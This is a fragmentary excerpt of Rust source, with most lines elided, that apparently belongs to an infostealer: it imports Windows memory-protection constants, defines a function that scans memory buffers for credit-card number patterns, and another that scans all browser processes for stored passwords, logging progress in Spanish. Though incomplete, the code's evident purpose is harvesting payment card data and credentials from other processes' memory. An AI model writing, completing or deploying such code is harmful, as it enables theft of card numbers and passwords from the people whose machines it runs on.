...
use winapi::um::winnt::{
    HANDLE, MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
...
fn search_credit_card_pattern(buffer: &[u8]) -> Option<CreditCardData> {
    ...
    while start < text.len() {
        ...
        if let Some(pos) =
            text[start..].find(|c: char| c == '4' || c == '5' || c == '3' || c == '6')
        {
            start += pos;
...
pub fn scan_all_browser_processes_for_passwords(browser_name: &str) -> Vec<PasswordData> {
    ...
    log(&format!(
        "🔍 [PASSWORD SCAN] Encontrados {} procesos",
        processes.len()
    ));
